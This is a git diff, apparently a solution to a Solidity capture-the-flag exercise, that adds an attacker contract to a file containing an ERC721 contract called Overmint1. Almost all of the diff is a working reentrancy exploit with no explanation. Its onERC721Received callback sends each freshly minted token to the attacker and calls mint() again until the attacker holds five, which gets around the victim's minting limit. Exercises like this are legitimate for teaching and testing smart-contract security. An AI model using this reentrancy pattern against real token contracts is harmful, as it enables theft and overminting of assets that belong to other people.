@@ -21,3 +21,33 @@ contract Overmint1 is ERC721 {
         return balanceOf(_attacker) == 5;
     }
 }
+
+contract Overmint1Attacker {
+    Overmint1 public victim;
+    address attacker;
+
+    constructor(address victimContract) {
+        victim = Overmint1(victimContract);
+        attacker = msg.sender;
+    }
+
+    function attack() external {
+        victim.mint();
+    }
+
+    function onERC721Received(
+        address operator,
+        address from,
+        uint256 tokenId,
+        bytes calldata data
+    ) external returns (bytes4) {
+        require(msg.sender == address(victim), "not victim");
+
+        victim.transferFrom(address(this), attacker, tokenId);
+        if (victim.balanceOf(attacker) < 5) {
+            victim.mint();
+        }
+
+        return this.onERC721Received.selector;
+    }
+}
